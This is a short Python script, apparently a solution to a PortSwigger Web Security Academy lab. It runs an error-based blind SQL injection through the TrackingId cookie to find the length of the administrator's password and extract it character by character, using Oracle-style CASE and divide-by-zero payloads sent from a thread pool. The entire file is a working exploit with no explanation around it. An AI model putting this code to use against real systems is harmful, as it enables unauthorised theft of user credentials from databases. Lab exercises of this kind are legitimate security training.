import requests
import concurrent.futures

#7v2e1aee90uiwvxjn0au
#lhqmwhgpfd9y65dtp464
payload_len = "ukuwnop85AgZgXU8' and (select case when (length(password) = {}) then 'a' else TO_CHAR(1/0) end from users where username='administrator')='a"
payload = "ukuwnop85AgZgXU8' and (select case when (substr(password,{},1) = '{}') then 'a' else TO_CHAR(1/0) end from users where username='administrator')='a"
values = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p','q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
vuln_url = "https://0ab700610409cb7d80c221a500f20048.web-security-academy.net/login"
session = "5rBu6SMGwwwlmBGPsiMvK7XL7YoSPga5"
def send_request_confirm(length):
    print("Starting with length {}".format(length))
    response = requests.get(url=vuln_url, cookies={
        "TrackingId": payload_len.format(length),
        "session": session
    })
    if ("Internal Server" not in str(response.content)): 
        print("Length is {}".format(length))
        print(response.content)

def send_request_confirm_pass(length, character):
    print("Starting with length {} and character {}".format(length, character))
    response = requests.get(url=vuln_url, cookies={
        "TrackingId": payload.format(length, character),
        "session": session
    })
    if ("Internal Server" not in str(response.content)): 
        print("Length is {} and character {}".format(length, character))
        print(response.content)


with concurrent.futures.ThreadPoolExecutor(max_workers=4) as tf:
    # results = [tf.submit(send_request_confirm, i) for i in range(35)]
    results = [[tf.submit(send_request_confirm_pass, j, values[i]) for i in range(len(values))] for j in range(1,21)]